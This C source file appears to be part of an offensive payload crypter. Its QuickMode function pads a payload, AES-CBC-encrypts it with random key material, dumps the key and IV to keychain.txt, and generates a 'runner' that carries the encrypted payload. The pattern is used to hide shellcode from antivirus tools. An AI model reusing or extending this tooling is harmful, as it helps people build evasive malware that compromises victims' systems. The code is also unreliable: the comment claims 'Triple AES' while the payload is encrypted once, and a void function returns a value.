#include <stdio.h>
#include <Windows.h>
#include "aes.h"
#include "util.h"

// Quick Mode - Triple AES

void QuickMode(OUT PVOID pPayload, IN SIZE_T sPayloadSize)
{
	// Init Tiny-AES struct
	struct AES_ctx tiny;
	struct PayloadInfo pPadded;
	pPadded.pPayload = NULL;
	pPadded.sPayloadSize = NULL;

	// Check for padding
	if ((sPayloadSize % 16) != 0)
	{
		printf("Padding payload...\n");
		PaddingAES(pPayload, sPayloadSize, &pPadded.pPayload, &pPadded.sPayloadSize);
		printf("New payload size: %ld bytes\n", pPadded.sPayloadSize);

	}
	else {
		pPadded.pPayload = pPayload;
		pPadded.sPayloadSize = sPayloadSize;
	}

	// Generate Keys and Encrypt
	printf("Encrypting payload...\n");

	BYTE pKey[32];
	BYTE pIV[16];

	FILE* fKeychain = fopen("keychain.txt", "w");
	fprintf(fKeychain, "****************************** KEYCHAIN ******************************");

	RandomBytes(pKey, 32);
	RandomBytes(pIV, 16);

	AES_init_ctx_iv(&tiny, pKey, pIV);
	AES_CBC_encrypt_buffer(&tiny, pPadded.pPayload, pPadded.sPayloadSize);

	fprintf(fKeychain, "\nBYTE pKey[] = { ");
	for (int j = 0; j < 32; j++) {
		if (j == 31)
		{
			fprintf(fKeychain, "0x%0.2X };", pKey[j]);
		}
		else {
			fprintf(fKeychain, "0x%0.2X, ", pKey[j]);
		}
	}
	fprintf(fKeychain, "\nBYTE pIV[] = { ");
	for (int j = 0; j < 16; j++) {
		if (j == 15)
		{
			fprintf(fKeychain, "0x%0.2X };", pIV[j]);
		}
		else {
			fprintf(fKeychain, "0x%0.2X, ", pIV[j]);
		}
	}

	fclose(fKeychain);
	printf("Keychain written to keychain.txt.\n");

	// Write to runner
	WriteRunner(pPadded.pPayload, pPadded.sPayloadSize, 1, "keychain.txt", 1);

	return EXIT_SUCCESS;
}

